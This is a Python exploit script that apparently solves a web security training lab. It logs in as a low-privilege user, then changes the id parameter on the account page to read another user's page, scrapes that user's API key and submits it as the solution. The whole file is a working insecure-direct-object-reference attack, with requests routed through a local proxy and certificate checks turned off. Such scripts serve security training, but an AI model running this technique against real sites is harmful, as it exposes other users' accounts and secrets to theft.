import sys
import requests
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PROXIES = { 'http' : 'http://127.0.0.1:8080', 'https' : 'http://127.0.0.1:8080' }

def horizontal_privilege_escalation(s, url):
    exploit_url = url +  "/my-account?id=carlos"

    # loging in as carlos
    print('(+) Logging in as carlos')
    r = s.get(exploit_url, verify=False, proxies=PROXIES)
    res = r.text
    if "carlos" in res:
        print("(+) Horizontal privilege escalation successful!")
        print('(+) Extracting the API key....')
        api_key = re.search("Your API Key is:(.*)", res).group(1)
        api_key = api_key.split('</div>')[0].strip()
        print('(+) Your API key is :' + api_key.split('</div>')[0])
        print('(+) Submitting as solution')

        submit_url = url + "/submitSolution"
        submit_data = { "answer" : api_key}
        r = s.post(submit_url, data=submit_data, verify=False, proxies=PROXIES)

        # verify submission
        r = s.get(url, verify=False, proxies=PROXIES)
        res = r.text
        if "Congratulations, you solved the lab!" in res:
            print("[*] Exploitation Successful!")
            sys.exit(-1)
        else:
            print("[*] Exploitation Failed.")
        
    else:
        print("Horizontal privilege escalation failed.")
        sys.exit(-1)
 

def get_csrf_token(s, url):
    login_url = url + "/login"
    r = s.get(login_url, verify=False, proxies=PROXIES)
    res = r.text
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input", {"name" : "csrf"})['value']
    return csrf

def get_user_carlos_api_key(s, url):
    login_url = url + "/login"
    csrf_token = get_csrf_token(s, url)
    login_Data = { "csrf" : csrf_token, "username" : "wiener", "password" : "peter" }

    # login as wiener user
    r = s.post(login_url, data=login_Data, verify=False, proxies=PROXIES)
    res = r.text
    if "Log out" in res:
        print('(+) Login successful!')
        horizontal_privilege_escalation(s, url)
    
    else:
        print('(+) User Wiener login failed.')
        sys.exit(-1)  

def main():
    if len(sys.argv) != 2:
        print('(+) Usage %s <url>' % sys.argv[0])
        print('(+) Example %s www.example.com' % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1].rstrip('/')
    print('[*] Starting the Exploit : User ID controlled by request parameter :')
    get_user_carlos_api_key(s, url)

if __name__ == "__main__":
    main()